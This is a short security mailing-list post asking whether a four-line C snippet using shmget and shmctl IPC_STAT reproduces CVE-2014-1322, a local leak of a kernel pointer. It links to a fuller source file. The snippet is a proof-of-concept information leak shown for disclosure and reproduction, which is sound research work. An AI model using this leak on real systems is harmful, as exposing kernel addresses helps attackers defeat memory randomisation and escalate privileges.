Subject: [FD] A way to trigger CVE-2014-1322 (userspace read kernel pointer)?

 

Hi,

There's a claim this triggers CVE-2014-1322 allowing local user to read
a kernel pointer:

int shm = shmget( IPC_PRIVATE, 0x1337, SHM_R | SHM_W );
struct shmid_ds lolz;
int res = shmctl( shm, IPC_STAT, &lolz );
printf( "%pn", lolz.shm_internal );

full source: http://maker.fea.st/CVE-2014-1322.c [1]

Is anyone able to reproduce?
